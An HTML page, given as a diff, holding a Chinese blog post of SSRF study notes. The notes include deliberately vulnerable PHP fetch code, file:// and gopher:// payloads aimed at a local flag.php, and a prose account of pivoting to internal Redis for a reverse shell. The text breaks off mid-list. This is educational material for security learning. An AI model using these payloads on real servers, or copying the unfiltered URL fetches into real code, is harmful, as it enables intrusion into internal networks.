@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>SSRF笔记 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='OWASP, SSRF' />
+  <meta itemprop="name" content="SSRF笔记">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="428">
+  <meta itemprop="keywords" content="OWASP,SSRF"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/ssrf/119/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="SSRF笔记">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="OWASP">
+    <meta property="article:tag" content="SSRF">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SSRF笔记">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/owasp/ssrf/119/" /><link rel="prev" href="https://dongyu29.github.io/posts/misc/108/" /><link rel="next" href="https://dongyu29.github.io/posts/owasp/ssrf/120/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "SSRF笔记",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/ssrf\/119\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, SSRF","wordcount":  428 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/ssrf\/119\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">SSRF笔记</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>SSRF笔记</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="428 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="基础" class="heading-element"><span>0.0.0.1  基础</span>
+  <a href="#%e5%9f%ba%e7%a1%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>SSRF(服务端请求伪造漏洞) 由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。</p>
+<p>一般情况下，SSRF针对的都是一些外网无法访问的内网，所以需要SSRF使目标后端去访问内网，进而达到我们攻击内网的目的。</p>
+<p>通过SSRF，我们可以访问目标内网的redis服务，mysql服务，smpt服务，fastcgi服务等</p>
+<p>造成漏洞的一些函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#58a1dd">file_get_contents</span>()<span style="color:#58a1dd">：将整个文件或一个url所指向的文件读入一个字符串中。</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">readfile</span>()<span style="color:#58a1dd">：输出一个文件的内容。</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">fsockopen</span>()<span style="color:#58a1dd">：打开一个网络连接或者一个Unix</span> <span style="color:#58a1dd">套接字连接。</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">curl_exec</span>()<span style="color:#58a1dd">：初始化一个新的会话，返回一个cURL句柄，供curl_setopt</span>()<span style="color:#58a1dd">，curl_exec</span>()<span style="color:#58a1dd">和curl_close</span>() <span style="color:#58a1dd">函数使用。</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">fopen</span>()<span style="color:#58a1dd">：打开一个文件文件或者</span> <span style="color:#58a1dd">URL。</span></span></span></code></pre></div><p><code>file_get_contents()/readfile()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$url</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;url&#39;</span>];;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">file_get_contents</span>(<span style="color:#58a1dd">$url</span>);
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p><code>fsockopen()</code></p>
+<p>fsockopen($hostname,$port,$errno,$errstr,$timeout) 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$host</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;url&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$fp</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">fsockopen</span>(<span style="color:#58a1dd">$host</span>, <span style="color:#a6be9d">80</span>, <span style="color:#58a1dd">$errno</span>, <span style="color:#58a1dd">$errstr</span>, <span style="color:#a6be9d">30</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#ff636f">!</span><span style="color:#58a1dd">$fp</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">$errstr</span><span style="color:#a6be9d"> (</span><span style="color:#a6be9d">$errno</span><span style="color:#a6be9d">)&lt;br /&gt;</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>;
+</span></span><span style="display:flex;"><span>} <span style="color:#ff636f">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$out</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;GET / HTTP/1.1</span><span style="color:#a6be9d">\r\n</span><span style="color:#a6be9d">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$out</span> <span style="color:#ff636f">.=</span> <span style="color:#a6be9d">&#34;Host: </span><span style="color:#a6be9d">$host\r\n</span><span style="color:#a6be9d">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$out</span> <span style="color:#ff636f">.=</span> <span style="color:#a6be9d">&#34;Connection: Close</span><span style="color:#a6be9d">\r\n\r\n</span><span style="color:#a6be9d">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">fwrite</span>(<span style="color:#58a1dd">$fp</span>, <span style="color:#58a1dd">$out</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">while</span> (<span style="color:#ff636f">!</span><span style="color:#58a1dd">feof</span>(<span style="color:#58a1dd">$fp</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">echo</span> <span style="color:#58a1dd">fgets</span>(<span style="color:#58a1dd">$fp</span>, <span style="color:#a6be9d">128</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">fclose</span>(<span style="color:#58a1dd">$fp</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p><code>curl_exec()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$url</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;url&#39;</span>]; 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$ch</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">curl_init</span>(<span style="color:#58a1dd">$url</span>);  <span style="color:#828b96;font-style:italic">//创造一个curl资源
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">curl_setopt</span>(<span style="color:#58a1dd">$ch</span>, <span style="color:#58a1dd">CURLOPT_HEADER</span>, <span style="color:#a6be9d">0</span>); <span style="color:#828b96;font-style:italic">//设置url和相应的选项
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">curl_setopt</span>(<span style="color:#58a1dd">$ch</span>, <span style="color:#58a1dd">CURLOPT_RETURNTRANSFER</span>, <span style="color:#a6be9d">1</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$result</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">curl_exec</span>(<span style="color:#58a1dd">$ch</span>); <span style="color:#828b96;font-style:italic">// 抓取url并将其传递给浏览器
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">curl_close</span>(<span style="color:#58a1dd">$ch</span>); <span style="color:#828b96;font-style:italic">//关闭curl资源
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">echo</span> (<span style="color:#58a1dd">$result</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><h5 id="ssrf攻击中涉及的一些协议" class="heading-element"><span>0.0.0.2  SSRF攻击中涉及的一些协议</span>
+  <a href="#ssrf%e6%94%bb%e5%87%bb%e4%b8%ad%e6%b6%89%e5%8f%8a%e7%9a%84%e4%b8%80%e4%ba%9b%e5%8d%8f%e8%ae%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="http" class="heading-element"><span>0.0.0.2.1  http</span>
+  <a href="#http" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>直接http访问</p>
+<h6 id="dict协议" class="heading-element"><span>0.0.0.2.2  dict协议</span>
+  <a href="#dict%e5%8d%8f%e8%ae%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><em>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</em></p>
+<p>先判断哪个端口存在web服务</p>
+<p>这里是直接用burp爆破端口就可以</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281000862.png" alt="image-20230328100031810" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281000862.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281000862.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281000862.png?size=large 2x" data-title="image-20230328100031810" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h6 id="file伪协议" class="heading-element"><span>0.0.0.2.3  file伪协议</span>
+  <a href="#file%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>file为协议就不用多说了</p>
+<p>payload：<code>?url=file:/var/www/html/flag.php</code></p>
+<p>但是需要知道文件具体位置才能读到敏感信息。</p>
+<h6 id="gopher协议" class="heading-element"><span>0.0.0.2.4  Gopher协议</span>
+  <a href="#gopher%e5%8d%8f%e8%ae%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>gopher协议支持发出GET、POST请求：可以先拦截get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。</p>
+<p>可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。</p>
+<p><code>curl</code>是支持<code>gopher协议</code>的，所以这也是<code>curl_exec()</code>容易出现漏洞的地方</p>
+</blockquote>
+<blockquote>
+<p>gopher://IP:port/_{TCP/IP数据流}</p>
+</blockquote>
+<p>那么，为什么ssrf要配合gopher协议呢？</p>
+<blockquote>
+<p>我觉得，是因为正常来说你只能传一个内网url+文件路径，没法做更多的操作，比如传马，比如绕过验证，但是curl_exec()支持gopher协议，gopher可以把一整个请求包打包塞进里面，那请求包能干的事我们就都能干， 并且就可以解决漏洞点不在GET参数的问题了 。</p>
+</blockquote>
+<p>在gopher协议中发送HTTP的数据，需要以下三步：</p>
+<blockquote>
+<p>1、构造HTTP数据包
+2、URL编码、替换回车换行为%0d%0a
+3、发送gopher协议</p>
+</blockquote>
+<p>在转换为URL编码时候有这么几个坑</p>
+<blockquote>
+<p>1、问号（？）需要转码为URL编码，也就是%3f
+2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
+3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>
+</blockquote>
+<p>这里我们需要构造一个POST的数据包</p>
+<pre tabindex="0"><code>gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+key=00f001523d0b955749ea5e3b0ca09b5f</code></pre><p>然后我们就可以进行url编码了，编码次数取决于我们访问次数。</p>
+<p>第一次编码：</p>
+<pre tabindex="0"><code>gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2036%0A%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7</code></pre><p>把%0A替换成%0d%0A，结尾加上%0d%0A,并且末尾要加上%0d%0a（\r\n）</p>
+<pre tabindex="0"><code>gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7%0d%0a</code></pre><p>然后在进行一次URL编码</p>
+<pre tabindex="0"><code>gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%25</code></pre><h5 id="ssrf打内网" class="heading-element"><span>0.0.0.3  SSRF打内网</span>
+  <a href="#ssrf%e6%89%93%e5%86%85%e7%bd%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>存在ssrf漏洞的站点主要利用四个协议，分别是http、file、gopher、dict协议。</p>
+<p>file协议拿来进行本地文件的读取，http协议拿来进行内网的ip扫描、端口探测，如果探测到6379端口，那么可以利用http、gopher、dict这几个协议来打开放6379端口的redis服务（一般开放了这个端口的是redis服务），原理是利用他们以目标机的身份执行对开启redis服务的内网机执行redis命令，最后反弹shell到我们的公网ip机上。</p>
+<ul>
+<li>redis</li>
+<li>fastcgi</li>
+<li>mysql</li>
+</ul>
+<p>到这里就不得不提gopherus这个工具的使用了：此工具可以自动生成 Gopher payload，以利用 SSRF并获得 RCE。</p>
+<p>该工具的攻击范围：</p>
+<ol>
+<li>MySQL (Port-3306)</li>
